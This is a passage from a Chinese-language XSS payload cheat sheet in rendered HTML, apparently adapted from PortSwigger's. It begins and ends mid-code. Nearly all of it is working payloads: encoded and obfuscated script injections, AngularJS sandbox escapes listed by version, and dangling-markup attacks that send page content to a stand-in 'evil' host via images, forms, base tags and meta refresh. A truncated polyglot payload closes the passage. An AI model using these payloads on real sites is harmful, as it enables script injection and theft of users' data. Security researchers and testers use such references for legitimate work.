<span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//portswigger-labs.net&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre><p>禁用引荐来源</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;</code></pre><h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>超长UTF-8</p><pre><code class="hljs gcode"><span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;<span class="hljs-meta">%</span>E<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;<span class="hljs-meta">%</span>F<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;<span class="hljs-meta">%</span>F<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;<span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;</code></pre><p>Unicode转义</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>Unicode转义ES6样式</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u</span><span class="hljs-template-variable">&#123;61&#125;</span><span class="xml">lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><p>Unicode转义ES6样式零填充</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u</span><span class="hljs-template-variable">&#123;0000000061&#125;</span><span class="xml">lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><p>十六进制编码JavaScript转义</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;\x61lert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>八进制编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;\141lert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(\061)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(\61)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>带有可选分号的十进制编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#106;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>带有HTML编码的SVG脚本</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#97;</span>lert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#x61;</span>lert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;NewLine;</span>(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">x=<span class="hljs-string">&quot;&amp;quot;,alert(1)//&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre><p>带填充零的十进制编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#0000106avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>十六进制编码实体</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>如果下一个字符不是a-f0-9，则不使用分号的十六进制编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;j&amp;#x61vascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a</span></span><span class="hljs-tag"><span class="hljs-string">avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>带填充零的十六进制编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x0000006a;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>十六进制编码不区分大小写</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#X6A;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>HTML实体</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;Tab;</span>script:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;NewLine;</span>script:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert<span class="hljs-symbol">&amp;lpar;</span>1<span class="hljs-symbol">&amp;rpar;</span>&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>网址编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:x=&#x27;%27-alert(1)-%27&#x27;;&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>HTML实体和URL编码</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:x=&#x27;<span class="hljs-symbol">&amp;percnt;</span>27-alert(1)-%27&#x27;;&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>Firefox在＆之后允许NULL</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;#x6a;</span>avascript:alert(1)&quot;</span>&gt;</span>Firefox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>Firefox允许在命名实体内使用NULL</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert(1)&quot;</span>&gt;</span>Firefox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>Firefox在开头的注释中允许使用NULL字符</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- &gt;&lt;img title=&quot;--&gt;</span>&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;<span class="hljs-comment">&lt;!-- &gt;&lt;img title=&quot;--&gt;</span>&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;</code></pre><p>带有base64的脚本src中的数据协议</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">data:text/javascript;base64,YWxlcnQoMSk</span>=&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><h3 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h3><p><strong>AngularJS沙箱逃逸</strong></p><p>版本：1.0.1-1.1.5</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p>版本：1.0.1-1.1.5（较短）</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p>版本：1.2.0-1.2.1</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>=<span class="hljs-string">&#x27;constructor&#x27;</span>;<span class="hljs-attr">b</span>=&#123;&#125;;a.sub.call.call(<span class="hljs-name">b[a].getOwnPropertyDescriptor</span>(<span class="hljs-name">b[a].getPrototypeOf</span>(<span class="hljs-name">a.sub</span>),a).value,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p>版本：1.2.2-1.2.5</p><pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre><p>版本：1.2.6-1.2.18</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">_</span>=<span class="hljs-string">&#x27;&#x27;</span>.sub).call.call(&#123;&#125;<span class="hljs-name">[$=&#x27;constructor&#x27;].getOwnPropertyDescriptor</span>(<span class="hljs-name">_.__proto__</span>,$).value,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p>版本：1.2.19-1.2.23</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">toString.constructor.prototype.toString</span>=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(<span class="hljs-name">toString.constructor</span>);&#125;&#125;</span></code></pre><p>版本：1.2.24-1.2.29</p><pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre><p>版本：1.2.27-1.2.29/1.3.0-1.3.20</p><pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre><p>版本：1.3.0</p><pre><code class="hljs sas">&#123;&#123;!ready <span class="hljs-variable">&amp;&amp;</span> (ready = true) <span class="hljs-variable">&amp;&amp;</span> (!<span class="hljs-meta">call</span>? $$watchers[0].get(toString.constructor.prototype): (a = apply) <span class="hljs-variable">&amp;&amp;</span>(apply = constructor) <span class="hljs-variable">&amp;&amp;</span>(valueOf = <span class="hljs-meta">call</span>) <span class="hljs-variable">&amp;&amp;</span>(<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.toString(<span class="hljs-string">&#x27;F = Function.prototype;&#x27;</span> +<span class="hljs-string">&#x27;F.apply = F.a;&#x27;</span> +<span class="hljs-string">&#x27;delete F.a;&#x27;</span> +<span class="hljs-string">&#x27;delete F.valueOf;&#x27;</span> +<span class="hljs-string">&#x27;alert(1);&#x27;</span>)));&#125;&#125;</code></pre><p>版本：1.3.3-1.3.18</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#123;&#125;<span class="hljs-name">[&#123;toString:[].join</span>,length:1,<span class="hljs-number">0</span>:&#x27;__proto__&#x27;&#125;].assign=[].join;<span class="hljs-string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre><p>版本：1.3.19</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;[&#123;toString:false,valueOf:[].join</span>,length:1,<span class="hljs-number">0</span>:&#x27;__proto__&#x27;&#125;].charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre><p>版本：1.3.20</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span></code></pre><p>版本：1.4.0-1.4.9</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre><p>版本：1.5.0-1.5.8</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>=&#123;<span class="hljs-string">&#x27;y&#x27;</span>:&#x27;&#x27;.constructor.prototype&#125;;x[&#x27;y&#x27;].charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span></code></pre><p>版本：1.5.9-1.5.11</p><pre><code class="hljs powershell">&#123;&#123;c=<span class="hljs-string">&#x27;&#x27;</span>.sub.call;b=<span class="hljs-string">&#x27;&#x27;</span>.sub.bind;a=<span class="hljs-string">&#x27;&#x27;</span>.sub.apply;c.<span class="hljs-variable">$apply</span>=<span class="hljs-variable">$apply</span>;c.<span class="hljs-variable">$eval</span>=b;op=<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>;<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>=null;od=<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>;<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>=(&#123;&#125;).toString;C=c.<span class="hljs-variable">$apply</span>(c);<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>=op;<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>=od;B=C(b,c,b);<span class="hljs-variable">$evalAsync</span>(<span class="hljs-string">&quot;</span><span class="hljs-string">astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;</span><span class="hljs-string">astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;</span><span class="hljs-string">astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;</span><span class="hljs-string">&quot;</span>);m1=B(<span class="hljs-variable">$</span><span class="hljs-variable">$asyncQueue</span>.pop().expression,null,<span class="hljs-variable">$root</span>);m2=B(C,null,m1);[].push.apply=m2;a=<span class="hljs-string">&#x27;&#x27;</span>.sub;<span class="hljs-variable">$eval</span>(<span class="hljs-string">&#x27;a(b.c)&#x27;</span>);[].push.apply=a;&#125;&#125;</code></pre><p>版本：&gt; = 1.6.0</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p>版本：&gt; = 1.6.0（较短）</p><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre><p><strong>基于DOM的AngularJS沙箱逃逸</strong></p><p>所有版本（Chrome）</p><pre><code class="hljs routeros">&lt;input autofocus <span class="hljs-attribute">ng-focus</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$event</span>.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&quot;</span>&gt;</code></pre><p>所有版本（Chrome）较短</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">ng-focus</span>=<span class="hljs-variable">$event</span>.path|orderBy:&#x27;(z=alert)(1)&#x27;&gt;</code></pre><p>所有版本（所有浏览器）都较短</p><pre><code class="hljs routeros">&lt;input autofocus <span class="hljs-attribute">ng-focus</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$event</span>.composedPath()|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&quot;</span>&gt;</code></pre><p>版本：1.2.0-1.5.0</p><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-app</span> <span class="hljs-attr">ng-csp</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-focus</span>=<span class="hljs-string">&quot;x=$event;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">f</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-repeat</span>=<span class="hljs-string">&quot;(key, value) in x.view&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-if</span>=<span class="hljs-string">&quot;key == &#x27;window&#x27;&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">[1].reduce</span>(<span class="hljs-name">value.alert</span>, <span class="hljs-number">1</span>); &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre><h3 id="无脚本攻击"><a href="#无脚本攻击" class="headerlink" title="无脚本攻击"></a>无脚本攻击</h3><p>背景属性</p><pre><code class="hljs stata">&lt;body background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span> background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span>&gt;&lt;thead background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span>&gt;&lt;tbody background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span>&gt;&lt;tfoot background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span>&gt;&lt;td background=&quot;<span class="hljs-comment">//evil?</span>&lt;<span class="hljs-keyword">table</span>&gt;&lt;th background=&quot;<span class="hljs-comment">//evil?</span></code></pre><p>链接href样式表</p><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=stylesheet <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>链接href图标</p><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=icon <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>Meta刷新</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; http://evil?</span></code></pre><p>Img通过src属性传递标记</p><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span><span class="hljs-string">&lt;image src=&quot;</span>//evil?</code></pre><p>使用track元素的视频</p><pre><code class="hljs haskell">&lt;video&gt;&lt;track <span class="hljs-keyword">default</span> src=&quot;//evil?</code></pre><p>使用sourcr元素和src属性的视频</p><pre><code class="hljs vim"><span class="hljs-symbol">&lt;video&gt;</span>&lt;<span class="hljs-keyword">source</span> src=<span class="hljs-comment">&quot;//evil?</span></code></pre><p>使用source元素和src属性的音频</p><pre><code class="hljs vim"><span class="hljs-symbol">&lt;audio&gt;</span>&lt;<span class="hljs-keyword">source</span> src=<span class="hljs-comment">&quot;//evil?</span></code></pre><p>输入src</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>使用formaction的按钮</p><pre><code class="hljs routeros">&lt;form&gt;&lt;button <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%&quot;</span> <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>使用formaction输入</p><pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;XSS&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%&quot;</span> <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>表单使用action</p><pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">form</span>=x <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%;&quot;</span>&gt;&lt;form <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>使用src属性的Isindex</p><pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>Isindex使用submit</p><pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">style</span>=width:100%;height:100%; <span class="hljs-attribute">value</span>=XSS <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre><p>Object data</p><pre><code class="hljs haskell">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>=&quot;//evil?</span></code></pre><p>iframe src</p><pre><code class="hljs 1c">&lt;iframe src=<span class="hljs-string">&quot;//evil?</span></code></pre><p>Embed src</p><pre><code class="hljs 1c">&lt;embed src=<span class="hljs-string">&quot;//evil?</span></code></pre><p>使用textarea标记并发布到外部站点</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">//evil</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span></code></pre><p>使用表单目标通过window.name传递标记数据</p><pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">form</span>=x&gt;XSS&lt;/button&gt;&lt;form <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">action</span>=//evil <span class="hljs-attribute">target</span>=<span class="hljs-string">&#x27;</span></code></pre><p>使用基本目标通过window.name传递标记数据</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://subdomain1.portswigger-labs.net/dangling_markup/name.html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">100</span> <span class="hljs-attr">color</span>=<span class="hljs-string">red</span>&gt;</span>You must click me<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;</span></span></code></pre><p>使用formtarget通过window.name传递标记数据</p><pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Click me&quot;</span> <span class="hljs-attribute">formaction</span>=http://subdomain1.portswigger-labs.net/dangling_markup/name.html <span class="hljs-attribute">formtarget</span>=<span class="hljs-string">&quot;</span></code></pre><p>使用基本href传递数据</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=abc <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%;position:absolute;font-size:1000px;&quot;</span>&gt;xss&lt;base <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil/</span></code></pre><p>使用embed src从页面传递数据</p><pre><code class="hljs awk">&lt;embed src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre><p>使用iframe窗口名称从页面传递数据</p><pre><code class="hljs awk">&lt;iframe src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre><p>使用object窗口名称从页面传递数据</p><pre><code class="hljs awk">&lt;object data=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre><p>使用frameset窗口名称从页面传递数据</p><pre><code class="hljs awk">&lt;frameset&gt;&lt;frame src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre><h3 id="多语言有效载荷"><a href="#多语言有效载荷" class="headerlink" title="多语言有效载荷"></a>多语言有效载荷</h3><p>多语言有效载荷1</p><pre><code class="hljs awk">javascript:<span class="hljs-regexp">/*--&gt;&lt;/</span>title&gt;&lt;<span class="hljs-regexp">/style&gt;&lt;/</span>textarea&gt;&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>xmp&gt;&lt;svg<span class="hljs-regexp">/onload=&#x27;+/</span><span 